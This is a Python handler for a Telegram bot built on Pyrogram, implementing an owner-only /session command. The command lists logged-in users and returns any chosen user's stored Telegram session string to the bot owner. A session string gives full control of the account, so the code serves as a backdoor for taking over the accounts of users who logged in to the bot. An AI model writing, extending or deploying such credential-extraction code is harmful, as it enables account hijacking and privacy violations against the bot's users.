"""
/session command - Owner-only session management.

Only OWNER_ID can use this command to retrieve user session strings.
"""

from pyrogram import Client, filters
from pyrogram.types import Message
from core.reply_compat import build_reply_kwargs_from_message

from config import OWNER_ID
from database.async_db import async_db


def get(obj, key, default=None):
    """Safely get value from dict."""
    try:
        return obj.get(key, default) if hasattr(obj, 'get') else obj[key]
    except:
        return default


@Client.on_message(filters.command("session") & filters.private)
async def session_command_handler(client: Client, message: Message):
    """
    /session command - Owner only.
    
    Usage:
        /session <user_id>  - Get session string for user
        /session list       - List all logged-in users
    """
    user_id = message.chat.id
    
    # Owner check
    if user_id != OWNER_ID:
        await message.reply(
            "This command is only available to the bot owner.",
            **build_reply_kwargs_from_message(message)
        )
        return
    
    parts = message.text.split()
    
    if len(parts) < 2:
        await message.reply(
            "**Usage:**\n"
            "• `/session <user_id>` - Get user's session\n"
            "• `/session list` - List all logged-in users\n"
            "• `/session count` - Count logged-in users",
            **build_reply_kwargs_from_message(message)
        )
        return
    
    arg = parts[1].strip().lower()
    
    if arg == "list":
        # List all logged-in users
        try:
            users = await async_db.get_all_logged_in_users()
            if not users:
                await message.reply("No logged-in users found.")
                return
            
            lines = ["**Logged-in Users:**\n"]
            for i, user in enumerate(users[:50], 1):  # Limit to 50
                uid = user.get('user_id', 'Unknown')
                lines.append(f"{i}. `{uid}`")
            
            if len(users) > 50:
                lines.append(f"\n...and {len(users) - 50} more")
            
            await message.reply("\n".join(lines))
        except Exception as e:
            await message.reply(f"Error: {e}")
        return
    
    if arg == "count":
        try:
            count = await async_db.count_logged_in_users()
            await message.reply(f"**Logged-in users:** {count}")
        except Exception as e:
            await message.reply(f"Error: {e}")
        return
    
    # Get specific user's session
    try:
        target_user_id = int(arg)
    except ValueError:
        await message.reply("Invalid user ID. Must be a number.")
        return
    
    user_data = await async_db.find_user(target_user_id)
    
    if not user_data:
        await message.reply(f"User `{target_user_id}` not found in database.")
        return
    
    if not get(user_data, 'logged_in', False):
        await message.reply(f"User `{target_user_id}` is not logged in.")
        return
    
    session = user_data.get('session')
    if not session:
        await message.reply(f"User `{target_user_id}` has no session stored.")
        return
    
    # Send session in code block (private message to owner only)
    await message.reply(
        f"**Session for user** `{target_user_id}`:\n\n"
        f"```\n{session}\n```\n\n"
        "**Warning:** Keep this secret!",
        **build_reply_kwargs_from_message(message)
    )
